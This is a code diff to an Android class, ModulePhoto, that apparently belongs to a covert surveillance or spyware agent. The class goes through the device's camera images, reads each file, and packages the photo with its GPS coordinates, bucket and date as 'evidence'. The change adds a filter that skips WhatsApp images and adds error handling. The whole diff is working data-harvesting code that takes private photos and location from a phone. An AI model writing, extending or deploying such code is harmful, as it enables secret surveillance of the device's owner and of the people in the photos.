@@ -137,21 +137,34 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 			final String lon = cursor.getString(lonColumn);
 
 			final String bucket = cursor.getString(bucketColumn);
+			if(!isMultimediaChat(bucket)) {
+				try {
+					AutoFile file = new AutoFile(path);
+					byte[] content = file.read();
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (visitor), bucket: " + bucket + " " + path);
+					}
 
-			AutoFile file = new AutoFile(path);
-
-			byte[] content = file.read();
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (visitor), " + path);
+					EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon, bucket, date), content, date);
+					content = null;
+				}catch(Exception ex){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (visitor), ERROR", ex);
+					}
+				}
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (visitor), ignoring multimedia image: " + bucket);
+				}
 			}
-
-			EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon, bucket, date), content, date);
-			content = null;
-
 
 			last = date.getTime();
 			return last;
 		}
+	}
+
+	private boolean isMultimediaChat(String bucket) {
+		return bucket.toLowerCase().contains("whatsapp");
 	}
 
 	public static long getCameraImages(Context context, ImageVisitor visitor, long lastTimestamp) {
